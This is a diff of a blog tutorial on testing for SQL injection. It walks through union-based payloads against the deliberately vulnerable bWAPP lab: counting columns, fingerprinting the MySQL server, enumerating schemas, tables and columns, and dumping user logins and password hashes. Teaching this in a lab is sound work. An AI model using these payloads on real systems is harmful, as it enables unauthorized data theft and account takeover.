@@ -2,7 +2,7 @@
 layout: "post"
 title: "Testing for SQL Injection Vulnerabilities"
 comments: true
-date: "2019-03-16 8:00"
+date: "2019-04-02 8:00"
 ---
 
 SQL injection (SQLi) is the submission of SQL syntax to a vulnerable input field, which is then used by an application in the dynamic construction of a database query. This attack is possible when user input is insufficiently validated and can be interpreted by a database management system (DBMS) as code. A malicious user can inject SQL to disrupt or alter queries to the database, potentially leading to the exposure of sensitive data such as usernames, passwords, and credit card numbers.
@@ -228,7 +228,7 @@ URL Parameters                        | Result
 ?test=iron&action=Search              | The movie 'Iron Man' is returned.
 ?title=iron'+or+1=1+-\-+&action=search | Presumably all movies are returned.
 
-The second request queries the database to select all movies where the title is like "%iron%" or where 1 is equal to 1. Since 1 is always equal to 1, the database selects all movies. The hypens at the end comments out everything that follows, preventing the DBMS from parsing the remainder of the query.
+The second request queries the database to select all movies where the title is like "%iron%" or where 1 is equal to 1. Since 1 is always equal to 1, the database selects all movies. The hyphens at the end comments out everything that follows, preventing the DBMS from parsing the remainder of the query.
 
 <!-- 
 The following codeblock messes up syntax highlighting beneath it if not converted to HTML.
@@ -273,29 +273,158 @@ ORDER BY title ASC;
 
 <!-- ===================================================================  -->
 
-### Types of SQL Injection
+### Exploiting a Vulnerability
 
-- error
-- union 
-- blind
-- database repsonses
+We've proven that we can successfully submit SQL syntax to alter a database query. If this is as far as we could go, it would still be worth reporting, however, it is almost always better to provide a proof of concept in the bug report. (Especially for bug bounties.)
 
-### Identify A Vulnerability
+><span class="warning">**IMPORTANT**</span>: Don't compromise an application or data that is in production.
 
-- stacked queries
-- fingerprint database management system
-- fingerprint user
-- get databases
-- get tables
-- get columns
-- get rows
-- escalate privileges
-- gain access to the server
+#### Union Based Exploitation
+
+The UNION operator is used to combine two or more SELECT statements. 
+
+```sql
+
+/* Example */
+
+SELECT column_one, column_two FROM table_one
+UNION
+SELECT column_one, column_two FROM table_two;
+
+/* This query would return all data in the column_one and column_two of both table_one and table_two. */
+
+```
+
+A union statement must meet two requirements to be successful:
+
+- Both data sets must have the same number of columns.
+- All data within a column must have a compatible data type. E.g. Strings cannot be combined with a numerical column.
+
+The movie table has 5 columns displayed in the application, so modify the URL to union a select statement with 5 columns. If an error is returned add an additional column. Continue to add columns to the select statement until the query is successful.
+
+
+URL Parameters                                  | Result
+------------------------------------------------|--------------------------------------------------------------------------------------------
+?title='UNION+SELECT+1,2,3,4,5+--+&action=1     | 'Error: The used SELECT statements have a different number of columns' is returned.
+?title='UNION+SELECT+1,2,3,4,5,6+--+&action=1   | 'Error: The used SELECT statements have a different number of columns' is returned.
+?title='UNION+SELECT+1,2,3,4,5,6,7+--+&action=1 | Presumably all movies are returned followed by a row containing the numbers 2, 3, 5, and 4.
+
+This indicates that the table which the application is querying contains 7 columns, but is only displaying 4 of those columns. Columns 2, 5, and 4, allow text data type. Column 3 is either a number or text data type. 
+
+#### Fingerprinting 
+
+Now we can begin to union more useful selections in place of the displayed numbers. Submit the following GET request to determine the database user, version number, name, and schema:
+
+{:style="overflow: auto; white-space: nowrap;"}
+ `?title='UNION+SELECT+1,current_user(),@@version,database(),schema(),6,7+--+&action=1` 
+
+The variables and functions in this query are built into MySQL. I pulled them from a generic MySQL injection cheat sheet. You can find links to SQLi payloads in the resources section below or by using any search engine, such as DuckDuckGo. 
+
+The reason I know we are working with MySQL is because the error message that was returned from the `?title=&action=search` request included the phrase "MySQL server". If a verbose error message was not returned, you could determine the DBMS by submitting database-specific operators and identifying which ones execute successfully. 
+
+E.g. The concatenation operator: 
+
+DBMS       | Concatenation
+-----------|------------------------------------
+MS SQL     | 'a' + 'a'
+MySQL      |  CONCAT('a','a')
+Oracle     |  'a' \|\| 'a', <br> CONCAT('a','a')
+Postgres   |  'a' \|\| 'a'
+
+After the SQL server and version number are identified, search for known vulnerabilities in those technologies.  
+
+#### Enumerating Databases
+
+Information_schema is default database on MySQL servers which contains metadata about the server.
+
+Replace one of the unioned columns with "schema_name" in the select statement from the information_schema.schemata table to determine the names of the databases on a MySQL 5.7.25 server.
+
+{:style="overflow: auto; white-space: nowrap;"}
+ `?title='UNION+SELECT+1,schema_name,3,4,5,6,7+FROM+information_schema.schemata--+&action=1` 
+
+ The default database name for bWAPP is "bWAPP".
+
+#### Enumerating Tables
+
+Select table_schema and table_name from information_schema.tables:
+
+{:style="overflow: auto; white-space: nowrap;"}
+`?title='UNION+SELECT+1,table_schema,3,table_name,5,6,7+FROM+information_schema.tables+--+&action=1`
+
+This returns all tables for all databases. If you only want to show the tables in bWAPP, append a WHERE clause to the previous query:
+
+{:style="overflow: auto; white-space: nowrap;"}
+`?title='UNION+SELECT+1,table_schema,3,table_name,5,6,7+FROM+information_schema.tables+WHERE+table_schema="bWAPP"--+&action=1`
+
+Results:
+
+Database | Table
+---------|---------
+bWAPP    | blog
+bWAPP    | heroes
+bWAPP    | movies
+bWAPP    | users
+bWAPP    | visitors
+
+#### Enumerating Columns
+
+Let's check out the 'users' table. Select table_name and column_name from information_schema.columns where table_name is equal to "users":
+
+{:style="overflow: auto; white-space: nowrap;"}
+`?title='UNION+SELECT+1,table_name,3,column_name,5,6,7+FROM+information_schema.columns+WHERE+table_name="users"--+&action=1`
+
+
+Results:
+
+Table | Column
+------|--------------------
+users | id
+users | login
+users | password
+users | email
+users | secret
+users | activation_code
+users | reset_code
+users | admin
+users | USER
+users | CURRENT_CONNECTIONS
+users | TOTAL_CONNECTIONS
+
+#### Dumping the Users Table
+
+The **users** table has 11 columns, but we only have four columns to work with. I am mostly interested in the username, password, email, and user permissions, so let's select those.
+
+{:style="overflow: auto; white-space: nowrap;"}
+`?title='UNION+SELECT+1,login,admin,password,email,6,7+FROM+users--+&action=1`
+
+Results:
+
+login | admin | email                    | password
+------|-------|--------------------------|-----------------------------------------
+A.I.M | 1     | bwapp-aim@mailinator.com | 6885858486f31043e5839c735d99457f045affd0
+bee   | 1     | bwapp-bee@mailinator.com | 6885858486f31043e5839c735d99457f045affd0
+
+A malicious user could attempt to decrypt the hashed passwords with tools like John the Ripper or THC Hydra. 
+
+#### Conclusion
+
+If you're interested in continuing, a few things you could try are:
+
+- **Continue dumping tables and columns** - Check out other columns in the users table. I've not tested it, but I'm curious if secret, activation_code, or reset_code could be used to take over another user's account.
+- **Stacked queries** - Try to append an UPDATE or INSERT statement to the SELECTION statement.
+- **Escalate privileges** - Create a non-admin user and attempt to escalate their privileges to admin using SQL injection.
+- **Remote code execution** - Execute code on the server through SQL injection.
+- **Increase the security setting** - bWAPP has low, medium, and high security options. We have been testing on low, but most applications are more secure.
 
 ## Reporting
 
-- standards
-- best practices
+When reporting vulnerability bugs, follow the guidelines provided by the company you work for or the platform you're testing on. E.g. Bugcrowd.
+
+Include detailed steps to reproduce the bug. Don't make any assumptions about the reader's experience with security vulnerabilites.
+
+Describe the bug in terms of its business impact, rather than the technical details of its exploitation.
+
+Take the time to proofread your report. Is it obvious which objects or people you're talking about when you refer to them?
 
 ## Resources
 
@@ -328,7 +457,7 @@ Known Vulnerabilities:
 Payloads:
 
 - [NetSPI - SQL attack queries](https://sqlwiki.netspi.com/attackQueries/) (2019)
-- [fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection/detect) (2016)
+- [fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection) (2016)
 - [Bug bounty cheat sheet - SQLi](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/sqli.md) - An unordered list of relevant cheat sheets. (2017)
 
 Bypassing Firewalls:
